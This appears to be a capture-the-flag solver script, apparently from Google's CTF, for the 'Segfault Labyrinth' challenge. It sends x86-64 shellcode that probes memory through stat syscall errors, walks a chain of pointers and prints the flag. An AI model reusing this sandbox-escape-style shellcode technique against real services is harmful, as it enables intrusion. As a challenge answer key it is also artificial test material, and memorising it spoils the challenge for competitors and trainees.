#!/usr/bin/env python3
# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *

context(os='linux', arch='amd64')

HOST = 'localhost'
PORT = 43181

gdb_script = """
pie break 0x142e
continue
"""

io = process('./../attachments/challenge', level='debug')
#io = gdb.debug('./../attachments/challenge', gdb_script)

#io = remote(HOST, PORT, level='debug')
#io.recvline_contains(b'== proof-of-work')
#io.sendline()

io.recvline_contains(b'Welcome to the Segfault Labyrinth')

code = """
mov r8, rdi

// NUM_LAYERS
mov rbx, 10
layer_loop:
test rbx, rbx
jz print_flag
// LAYER_SIZE
mov rcx, 16
element_loop:
test rcx, rcx
jz element_loop_end

// sys_stat
mov rax, 4
mov rdi, qword ptr [r8]
lea rsi, [rip+0x200]
syscall
// EFAULT
cmp rax, -14
jne element_loop_end
add r8, 8

dec rcx
jmp element_loop

element_loop_end:
mov r8, qword ptr [r8]
dec rbx
jmp layer_loop

print_flag:
mov rax, 1
mov rsi, r8
mov rdi, 1
mov rdx, 128
syscall

loop:
jmp loop
"""

payload = asm(code.strip())
io.send(p64(len(payload)))
io.send(payload)

output = io.recvall().strip(b'\0').strip()
flag = output.decode()
log.info('Flag: %s', flag)
